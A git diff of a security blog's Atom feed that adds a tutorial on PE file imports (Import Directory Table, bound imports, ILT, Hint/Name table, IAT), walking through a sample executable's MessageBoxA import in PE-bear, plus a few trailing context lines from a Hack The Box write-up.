@@ -1,4 +1,168 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.2.1">Jekyll</generator><link href="https://0xrick.github.io/feed.xml" rel="self" type="application/atom+xml" /><link href="https://0xrick.github.io/" rel="alternate" type="text/html" /><updated>2021-10-27T16:14:16+02:00</updated><id>https://0xrick.github.io/feed.xml</id><title type="html">0xRick’s Blog</title><subtitle>Infosec blog.</subtitle><author><name>0xRick</name></author><entry><title type="html">A dive into the PE file format - PE file structure - Part 4: Data Directories, Section Headers and Sections</title><link href="https://0xrick.github.io/win-internals/pe5/" rel="alternate" type="text/html" title="A dive into the PE file format - PE file structure - Part 4: Data Directories, Section Headers and Sections" /><published>2021-10-27T03:00:00+02:00</published><updated>2021-10-27T03:00:00+02:00</updated><id>https://0xrick.github.io/win-internals/pe5</id><content type="html" xml:base="https://0xrick.github.io/win-internals/pe5/">&lt;h2 id=&quot;a-dive-into-the-pe-file-format---pe-file-structure---part-4-data-directories-section-headers-and-sections&quot;&gt;A dive into the PE file format - PE file structure - Part 4: Data Directories, Section Headers and Sections&lt;/h2&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.2.1">Jekyll</generator><link href="https://0xrick.github.io/feed.xml" rel="self" type="application/atom+xml" /><link href="https://0xrick.github.io/" rel="alternate" type="text/html" /><updated>2021-10-28T01:57:06+02:00</updated><id>https://0xrick.github.io/feed.xml</id><title type="html">0xRick’s Blog</title><subtitle>Infosec blog.</subtitle><author><name>0xRick</name></author><entry><title type="html">A dive into the PE file format - PE file structure - Part 5: PE Imports (Import Directory Table, ILT, IAT)</title><link href="https://0xrick.github.io/win-internals/pe6/" rel="alternate" type="text/html" title="A dive into the PE file format - PE file structure - Part 5: PE Imports (Import Directory Table, ILT, IAT)" /><published>2021-10-28T03:00:00+02:00</published><updated>2021-10-28T03:00:00+02:00</updated><id>https://0xrick.github.io/win-internals/pe6</id><content type="html" xml:base="https://0xrick.github.io/win-internals/pe6/">&lt;h2 id=&quot;a-dive-into-the-pe-file-format---pe-file-structure---part-5-pe-imports-import-directory-table-ilt-iat&quot;&gt;A dive into the PE file format - PE file structure - Part 5: PE Imports (Import Directory Table, ILT, IAT)&lt;/h2&gt;
+
+&lt;h3 id=&quot;introduction&quot;&gt;Introduction&lt;/h3&gt;
+
+&lt;p&gt;In this post we’re going to talk about a very important aspect of PE files, the PE imports.
+To understand how PE files handle their imports, we’ll go over some of the Data Directories present in the Import Data section (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.idata&lt;/code&gt;), the Import Directory Table, the Import Lookup Table (ILT) or also referred to as the Import Name Table (INT) and the Import Address Table (IAT).&lt;/p&gt;
+
+&lt;hr /&gt;
+
+&lt;h3 id=&quot;import-directory-table&quot;&gt;Import Directory Table&lt;/h3&gt;
+
+&lt;p&gt;The Import Directory Table is a Data Directory located at the beginning of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.idata&lt;/code&gt; section.&lt;/p&gt;
+
+&lt;p&gt;It consists of an array of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;IMAGE_IMPORT_DESCRIPTOR&lt;/code&gt; structures, each one of them is for a DLL.
+&lt;br /&gt;It doesn’t have a fixed size, so the last &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;IMAGE_IMPORT_DESCRIPTOR&lt;/code&gt; of the array is zeroed-out (NULL-Padded) to indicate the end of the Import Directory Table.&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;IMAGE_IMPORT_DESCRIPTOR&lt;/code&gt; is defined as follows:&lt;/p&gt;
+
+&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;typedef&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_IMAGE_IMPORT_DESCRIPTOR&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;union&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;DWORD&lt;/span&gt;   &lt;span class=&quot;n&quot;&gt;Characteristics&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;DWORD&lt;/span&gt;   &lt;span class=&quot;n&quot;&gt;OriginalFirstThunk&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;DUMMYUNIONNAME&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;DWORD&lt;/span&gt;   &lt;span class=&quot;n&quot;&gt;TimeDateStamp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;DWORD&lt;/span&gt;   &lt;span class=&quot;n&quot;&gt;ForwarderChain&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;DWORD&lt;/span&gt;   &lt;span class=&quot;n&quot;&gt;Name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;DWORD&lt;/span&gt;   &lt;span class=&quot;n&quot;&gt;FirstThunk&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IMAGE_IMPORT_DESCRIPTOR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;typedef&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IMAGE_IMPORT_DESCRIPTOR&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;UNALIGNED&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;PIMAGE_IMPORT_DESCRIPTOR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;strong&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;OriginalFirstThunk&lt;/code&gt;:&lt;/strong&gt; RVA of the ILT.&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;TimeDateStamp&lt;/code&gt;:&lt;/strong&gt; A time date stamp, that’s initially set to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0&lt;/code&gt; if not bound and set to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-1&lt;/code&gt; if bound.
+&lt;br /&gt;In case of an unbound import the time date stamp gets updated to the time date stamp of the DLL after the image is bound.
+&lt;br /&gt;In case of a bound import it stays set to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-1&lt;/code&gt; and the real time date stamp of the DLL can be found in the Bound Import Directory Table in the corresponding &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;IMAGE_BOUND_IMPORT_DESCRIPTOR&lt;/code&gt; .
+&lt;br /&gt;We’ll discuss bound imports in the next section.&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ForwarderChain&lt;/code&gt;:&lt;/strong&gt; The index of the first forwarder chain reference.
+&lt;br /&gt;This is something responsible for DLL forwarding. (DLL forwarding is when a DLL forwards some of its exported functions to another DLL.)&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Name&lt;/code&gt;:&lt;/strong&gt; An RVA of an ASCII string that contains the name of the imported DLL.&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;FirstThunk&lt;/code&gt;:&lt;/strong&gt; RVA of the IAT.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;hr /&gt;
+
+&lt;h3 id=&quot;bound-imports&quot;&gt;Bound Imports&lt;/h3&gt;
+
+&lt;p&gt;A bound import essentially means that the import table contains fixed addresses for the imported functions.
+&lt;br /&gt;These addresses are calculated and written during compile time by the linker.&lt;/p&gt;
+
+&lt;p&gt;Using bound imports is a speed optimization, it reduces the time needed by the loader to resolve function addresses and fill the IAT, however if at run-time the bound addresses do not match the real ones then the loader will have to resolve these addresses again and fix the IAT.&lt;/p&gt;
+
+&lt;p&gt;When discussing &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;IMAGE_IMPORT_DESCRIPTOR.TimeDateStamp&lt;/code&gt;, I mentioned that in case of a bound import, the time date stamp is set to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-1&lt;/code&gt; and the real time date stamp of the DLL can be found in the corresponding &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;IMAGE_BOUND_IMPORT_DESCRIPTOR&lt;/code&gt; in the Bound Import Data Directory.&lt;/p&gt;
+
+&lt;h4 id=&quot;bound-import-data-directory&quot;&gt;Bound Import Data Directory&lt;/h4&gt;
+
+&lt;p&gt;The Bound Import Data Directory is similar to the Import Directory Table, however as the name suggests, it holds information about the bound imports.&lt;/p&gt;
+
+&lt;p&gt;It consists of an array of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;IMAGE_BOUND_IMPORT_DESCRIPTOR&lt;/code&gt; structures, and ends with a zeroed-out &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;IMAGE_BOUND_IMPORT_DESCRIPTOR&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;IMAGE_BOUND_IMPORT_DESCRIPTOR&lt;/code&gt; is defined as follows:&lt;/p&gt;
+
+&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;typedef&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_IMAGE_BOUND_IMPORT_DESCRIPTOR&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;DWORD&lt;/span&gt;   &lt;span class=&quot;n&quot;&gt;TimeDateStamp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;WORD&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;OffsetModuleName&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;WORD&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;NumberOfModuleForwarderRefs&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;c1&quot;&gt;// Array of zero or more IMAGE_BOUND_FORWARDER_REF follows&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IMAGE_BOUND_IMPORT_DESCRIPTOR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;PIMAGE_BOUND_IMPORT_DESCRIPTOR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;strong&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;TimeDateStamp&lt;/code&gt;:&lt;/strong&gt; The time date stamp of the imported DLL.&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;OffsetModuleName&lt;/code&gt;:&lt;/strong&gt; An offset to a string with the name of the imported DLL.
+&lt;br /&gt;It’s an offset from the first &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;IMAGE_BOUND_IMPORT_DESCRIPTOR&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;NumberOfModuleForwarderRefs&lt;/code&gt;:&lt;/strong&gt; The number of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;IMAGE_BOUND_FORWARDER_REF&lt;/code&gt; structures that immediately follow this structure.
+&lt;br /&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;IMAGE_BOUND_FORWARDER_REF&lt;/code&gt; is a structure that’s identical to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;IMAGE_BOUND_IMPORT_DESCRIPTOR&lt;/code&gt;, the only difference is that the last member is reserved.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;That’s all we need to know about bound imports.&lt;/p&gt;
+
+&lt;hr /&gt;
+
+&lt;h3 id=&quot;import-lookup-table-ilt&quot;&gt;Import Lookup Table (ILT)&lt;/h3&gt;
+
+&lt;p&gt;Sometimes people refer to it as the Import Name Table (INT).&lt;/p&gt;
+
+&lt;p&gt;Every imported DLL has an Import Lookup Table.
+&lt;br /&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;IMAGE_IMPORT_DESCRIPTOR.OriginalFirstThunk&lt;/code&gt; holds the RVA of the ILT of the corresponding DLL.&lt;/p&gt;
+
+&lt;p&gt;The ILT is essentially a table of names or references, it tells the loader which functions are needed from the imported DLL.&lt;/p&gt;
+
+&lt;p&gt;The ILT consists of an array of 32-bit numbers (for PE32) or 64-bit numbers for (PE32+), the last one is zeroed-out to indicate the end of the ILT.&lt;/p&gt;
+
+&lt;p&gt;Each entry of these entries encodes information as follows:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;strong&gt;Bit 31/63 (most significant bit)&lt;/strong&gt;: This is called the Ordinal/Name flag, it specifies whether to import the function by name or by ordinal.&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;Bits 15-0:&lt;/strong&gt; If the Ordinal/Name flag is set to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;1&lt;/code&gt; these bits are used to hold the 16-bit ordinal number that will be used to import the function, bits 30-15/62-15 for PE32/PE32+ must be set to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0&lt;/code&gt;.&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;Bits 30-0:&lt;/strong&gt; If the Ordinal/Name flag is set to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0&lt;/code&gt; these bits are used to hold an RVA of a Hint/Name table.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h4 id=&quot;hintname-table&quot;&gt;Hint/Name Table&lt;/h4&gt;
+
+&lt;p&gt;A Hint/Name table is a structure defined in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;winnt.h&lt;/code&gt; as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;IMAGE_IMPORT_BY_NAME&lt;/code&gt;:&lt;/p&gt;
+
+&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;typedef&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_IMAGE_IMPORT_BY_NAME&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;WORD&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;Hint&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;CHAR&lt;/span&gt;   &lt;span class=&quot;n&quot;&gt;Name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IMAGE_IMPORT_BY_NAME&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;PIMAGE_IMPORT_BY_NAME&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;strong&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Hint&lt;/code&gt;:&lt;/strong&gt; A word that contains a number, this number is used to look-up the function, that number is first used as an index into the export name pointer table, if that initial check fails a binary search is performed on the DLL’s export name pointer table.&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Name&lt;/code&gt;:&lt;/strong&gt; A null-terminated string that contains the name of the function to import.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;hr /&gt;
+
+&lt;h3 id=&quot;import-address-table-iat&quot;&gt;Import Address Table (IAT)&lt;/h3&gt;
+
+&lt;p&gt;On disk, the IAT is identical to the ILT, however during bounding when the binary is being loaded into memory, the entries of the IAT get overwritten with the addresses of the functions that are being imported.&lt;/p&gt;
+
+&lt;hr /&gt;
+
+&lt;h3 id=&quot;summary&quot;&gt;Summary&lt;/h3&gt;
+
+&lt;p&gt;So to summarize what we discussed in this post, for every DLL the executable is loading functions from, there will be an &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;IMAGE_IMPORT_DESCRIPTOR&lt;/code&gt; within the Image Directory Table.
+&lt;br /&gt;The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;IMAGE_IMPORT_DESCRIPTOR&lt;/code&gt; will contain the name of the DLL, and two fields holding RVAs of the ILT and the IAT.
+&lt;br /&gt;The ILT will contain references for all the functions that are being imported from the DLL.
+&lt;br /&gt;The IAT will be identical to the ILT until the executable is loaded in memory, then the loader will fill the IAT with the actual addresses of the imported functions.
+&lt;br /&gt;If the DLL import is a bound import, then the import information will be contained in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;IMAGE_BOUND_IMPORT_DESCRIPTOR&lt;/code&gt; structures in a separate Data Directory called the Bound Import Data Directory.&lt;/p&gt;
+
+&lt;p&gt;Let’s take a quick look at the import information inside of an actual PE file.&lt;/p&gt;
+
+&lt;p&gt;Here’s the Import Directory Table of the executable:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/wininternals/pe6/1.png&quot; alt=&quot;&quot; class=&quot;align-center&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;All of these entries are &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;IMAGE_IMPORT_DESCRIPTOR&lt;/code&gt;s.&lt;/p&gt;
+
+&lt;p&gt;As you can see, the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;TimeDateStamp&lt;/code&gt; of all the imports is set to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0&lt;/code&gt;, meaning that none of these imports are bound, this is also confirmed in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Bound?&lt;/code&gt; column added by PE-bear.&lt;/p&gt;
+
+&lt;p&gt;For example, if we take &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;USER32.dll&lt;/code&gt; and follow the RVA of its ILT (referenced by &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;OriginalFirstThunk&lt;/code&gt;), we’ll find only 1 entry (because only one function is imported), and that entry looks like this:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/wininternals/pe6/2.png&quot; alt=&quot;&quot; class=&quot;align-center&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;This is a 64-bit executable, so the entry is 64 bits long.
+&lt;br /&gt;As you can see, the last byte is set to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0&lt;/code&gt;, indicating that a Hint/Table name should be used to look-up the function.
+&lt;br /&gt;We know that the RVA of this Hint/Table name should be referenced by the first 2 bytes, so we should follow RVA &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x29F8&lt;/code&gt;:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/wininternals/pe6/3.png&quot; alt=&quot;&quot; class=&quot;align-center&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/wininternals/pe6/4.png&quot; alt=&quot;&quot; class=&quot;align-center&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Now we’re looking at an &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;IMAGE_IMPORT_BY_NAME&lt;/code&gt; structure, first two bytes hold the hint, which in this case is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x283&lt;/code&gt;, the rest of the structure holds the full name of the function which is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;MessageBoxA&lt;/code&gt;.
+&lt;br /&gt;We can verify that our interpretation of the data is correct by looking at how PE-bear parsed it, and we’ll see the same results:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/wininternals/pe6/5.png&quot; alt=&quot;&quot; class=&quot;align-center&quot; /&gt;&lt;/p&gt;
+
+&lt;hr /&gt;
+
+&lt;h3 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h3&gt;
+
+&lt;p&gt;That’s all I have to say about PE imports, in the next post I’ll discuss PE base relocations.
+&lt;br /&gt;Thanks for reading.&lt;/p&gt;</content><author><name>0xRick</name></author><category term="win-internals" /><category term="windows" /><category term="pe" /><category term="os-internals" /><summary type="html">A dive into the PE file format - PE file structure - Part 5: PE Imports (Import Directory Table, ILT, IAT) Introduction In this post we’re going to talk about a very important aspect of PE files, the PE imports. To understand how PE files handle their imports, we’ll go over some of the Data Directories present in the Import Data section (.idata), the Import Directory Table, the Import Lookup Table (ILT) or also referred to as the Import Name Table (INT) and the Import Address Table (IAT). Import Directory Table The Import Directory Table is a Data Directory located at the beginning of the .idata section. It consists of an array of IMAGE_IMPORT_DESCRIPTOR structures, each one of them is for a DLL. It doesn’t have a fixed size, so the last IMAGE_IMPORT_DESCRIPTOR of the array is zeroed-out (NULL-Padded) to indicate the end of the Import Directory Table. IMAGE_IMPORT_DESCRIPTOR is defined as follows: typedef struct _IMAGE_IMPORT_DESCRIPTOR { union { DWORD Characteristics; DWORD OriginalFirstThunk; } DUMMYUNIONNAME; DWORD TimeDateStamp; DWORD ForwarderChain; DWORD Name; DWORD FirstThunk; } IMAGE_IMPORT_DESCRIPTOR; typedef IMAGE_IMPORT_DESCRIPTOR UNALIGNED *PIMAGE_IMPORT_DESCRIPTOR; OriginalFirstThunk: RVA of the ILT. TimeDateStamp: A time date stamp, that’s initially set to 0 if not bound and set to -1 if bound. In case of an unbound import the time date stamp gets updated to the time date stamp of the DLL after the image is bound. In case of a bound import it stays set to -1 and the real time date stamp of the DLL can be found in the Bound Import Directory Table in the corresponding IMAGE_BOUND_IMPORT_DESCRIPTOR . We’ll discuss bound imports in the next section. ForwarderChain: The index of the first forwarder chain reference. This is something responsible for DLL forwarding. (DLL forwarding is when a DLL forwards some of its exported functions to another DLL.) Name: An RVA of an ASCII string that contains the name of the imported DLL. FirstThunk: RVA of the IAT. Bound Imports A bound import essentially means that the import table contains fixed addresses for the imported functions. These addresses are calculated and written during compile time by the linker. Using bound imports is a speed optimization, it reduces the time needed by the loader to resolve function addresses and fill the IAT, however if at run-time the bound addresses do not match the real ones then the loader will have to resolve these addresses again and fix the IAT. When discussing IMAGE_IMPORT_DESCRIPTOR.TimeDateStamp, I mentioned that in case of a bound import, the time date stamp is set to -1 and the real time date stamp of the DLL can be found in the corresponding IMAGE_BOUND_IMPORT_DESCRIPTOR in the Bound Import Data Directory. Bound Import Data Directory The Bound Import Data Directory is similar to the Import Directory Table, however as the name suggests, it holds information about the bound imports. It consists of an array of IMAGE_BOUND_IMPORT_DESCRIPTOR structures, and ends with a zeroed-out IMAGE_BOUND_IMPORT_DESCRIPTOR. IMAGE_BOUND_IMPORT_DESCRIPTOR is defined as follows: typedef struct _IMAGE_BOUND_IMPORT_DESCRIPTOR { DWORD TimeDateStamp; WORD OffsetModuleName; WORD NumberOfModuleForwarderRefs; // Array of zero or more IMAGE_BOUND_FORWARDER_REF follows } IMAGE_BOUND_IMPORT_DESCRIPTOR, *PIMAGE_BOUND_IMPORT_DESCRIPTOR; TimeDateStamp: The time date stamp of the imported DLL. OffsetModuleName: An offset to a string with the name of the imported DLL. It’s an offset from the first IMAGE_BOUND_IMPORT_DESCRIPTOR NumberOfModuleForwarderRefs: The number of the IMAGE_BOUND_FORWARDER_REF structures that immediately follow this structure. IMAGE_BOUND_FORWARDER_REF is a structure that’s identical to IMAGE_BOUND_IMPORT_DESCRIPTOR, the only difference is that the last member is reserved. That’s all we need to know about bound imports. Import Lookup Table (ILT) Sometimes people refer to it as the Import Name Table (INT). Every imported DLL has an Import Lookup Table. IMAGE_IMPORT_DESCRIPTOR.OriginalFirstThunk holds the RVA of the ILT of the corresponding DLL. The ILT is essentially a table of names or references, it tells the loader which functions are needed from the imported DLL. The ILT consists of an array of 32-bit numbers (for PE32) or 64-bit numbers for (PE32+), the last one is zeroed-out to indicate the end of the ILT. Each entry of these entries encodes information as follows: Bit 31/63 (most significant bit): This is called the Ordinal/Name flag, it specifies whether to import the function by name or by ordinal. Bits 15-0: If the Ordinal/Name flag is set to 1 these bits are used to hold the 16-bit ordinal number that will be used to import the function, bits 30-15/62-15 for PE32/PE32+ must be set to 0. Bits 30-0: If the Ordinal/Name flag is set to 0 these bits are used to hold an RVA of a Hint/Name table. Hint/Name Table A Hint/Name table is a structure defined in winnt.h as IMAGE_IMPORT_BY_NAME: typedef struct _IMAGE_IMPORT_BY_NAME { WORD Hint; CHAR Name[1]; } IMAGE_IMPORT_BY_NAME, *PIMAGE_IMPORT_BY_NAME; Hint: A word that contains a number, this number is used to look-up the function, that number is first used as an index into the export name pointer table, if that initial check fails a binary search is performed on the DLL’s export name pointer table. Name: A null-terminated string that contains the name of the function to import. Import Address Table (IAT) On disk, the IAT is identical to the ILT, however during bounding when the binary is being loaded into memory, the entries of the IAT get overwritten with the addresses of the functions that are being imported. Summary So to summarize what we discussed in this post, for every DLL the executable is loading functions from, there will be an IMAGE_IMPORT_DESCRIPTOR within the Image Directory Table. The IMAGE_IMPORT_DESCRIPTOR will contain the name of the DLL, and two fields holding RVAs of the ILT and the IAT. The ILT will contain references for all the functions that are being imported from the DLL. The IAT will be identical to the ILT until the executable is loaded in memory, then the loader will fill the IAT with the actual addresses of the imported functions. If the DLL import is a bound import, then the import information will be contained in IMAGE_BOUND_IMPORT_DESCRIPTOR structures in a separate Data Directory called the Bound Import Data Directory. Let’s take a quick look at the import information inside of an actual PE file. Here’s the Import Directory Table of the executable: All of these entries are IMAGE_IMPORT_DESCRIPTORs. As you can see, the TimeDateStamp of all the imports is set to 0, meaning that none of these imports are bound, this is also confirmed in the Bound? column added by PE-bear. For example, if we take USER32.dll and follow the RVA of its ILT (referenced by OriginalFirstThunk), we’ll find only 1 entry (because only one function is imported), and that entry looks like this: This is a 64-bit executable, so the entry is 64 bits long. As you can see, the last byte is set to 0, indicating that a Hint/Table name should be used to look-up the function. We know that the RVA of this Hint/Table name should be referenced by the first 2 bytes, so we should follow RVA 0x29F8: Now we’re looking at an IMAGE_IMPORT_BY_NAME structure, first two bytes hold the hint, which in this case is 0x283, the rest of the structure holds the full name of the function which is MessageBoxA. We can verify that our interpretation of the data is correct by looking at how PE-bear parsed it, and we’ll see the same results: Conclusion That’s all I have to say about PE imports, in the next post I’ll discuss PE base relocations. Thanks for reading.</summary></entry><entry><title type="html">A dive into the PE file format - PE file structure - Part 4: Data Directories, Section Headers and Sections</title><link href="https://0xrick.github.io/win-internals/pe5/" rel="alternate" type="text/html" title="A dive into the PE file format - PE file structure - Part 4: Data Directories, Section Headers and Sections" /><published>2021-10-27T03:00:00+02:00</published><updated>2021-10-27T03:00:00+02:00</updated><id>https://0xrick.github.io/win-internals/pe5</id><content type="html" xml:base="https://0xrick.github.io/win-internals/pe5/">&lt;h2 id=&quot;a-dive-into-the-pe-file-format---pe-file-structure---part-4-data-directories-section-headers-and-sections&quot;&gt;A dive into the PE file format - PE file structure - Part 4: Data Directories, Section Headers and Sections&lt;/h2&gt;
 
 &lt;h3 id=&quot;introduction&quot;&gt;Introduction&lt;/h3&gt;
 
@@ -3151,410 +3315,4 @@ And we owned root !
 Thanks for reading.&lt;br /&gt;&lt;/p&gt;
 
 &lt;p&gt;Previous Hack The Box write-up : &lt;a href=&quot;/hack-the-box/craft/&quot;&gt;Hack The Box - Craft&lt;/a&gt;
